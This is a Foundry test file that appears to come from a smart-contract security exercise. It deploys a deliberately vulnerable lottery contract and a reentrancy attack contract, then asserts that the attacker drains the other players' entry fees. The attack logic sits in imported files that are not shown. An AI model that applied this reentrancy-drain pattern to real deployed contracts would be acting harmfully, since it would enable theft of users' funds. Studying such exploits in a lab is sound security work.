// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Lottery} from "../src/VulnerableLottery.sol";
import {ReentrancyAttack} from "../src/ReentrancyAttack.sol";

contract ReentrancyAttackTest is Test {
    uint256 public constant PARITICIPATION_FEE = 1e16;

    address attacker = makeAddr("attacker");
    address[] players = [
        makeAddr("p1"),
        makeAddr("p2"),
        makeAddr("p3"),
        makeAddr("p4"),
        makeAddr("p5")
    ];

    Lottery public lottery;
    ReentrancyAttack public attackContract;

    function setUp() public {
        lottery = new Lottery();

        vm.prank(attacker);
        attackContract = new ReentrancyAttack(address(lottery));

        vm.deal(address(attackContract), PARITICIPATION_FEE);

        for (uint256 i = 0; i < 5; i++) vm.deal(players[i], PARITICIPATION_FEE);
    }

    function test_reentrancyAttack() public {
        uint256 playerCount = 5;
        uint256 prize = playerCount * PARITICIPATION_FEE;

        uint256 oldBalance = address(attacker).balance;

        for (uint256 i = 0; i < playerCount; i++) {
            vm.prank(players[i]);
            lottery.enterLottery{value: PARITICIPATION_FEE}();
        }
        vm.prank(address(attackContract));
        lottery.enterLottery{value: PARITICIPATION_FEE}();

        vm.prank(address(attackContract));
        lottery.withdrawFromLottery();

        vm.prank(attacker);
        attackContract.withdraw();

        uint256 newBalance = address(attacker).balance;

        assertEq(oldBalance + prize + PARITICIPATION_FEE, newBalance);
    }
}
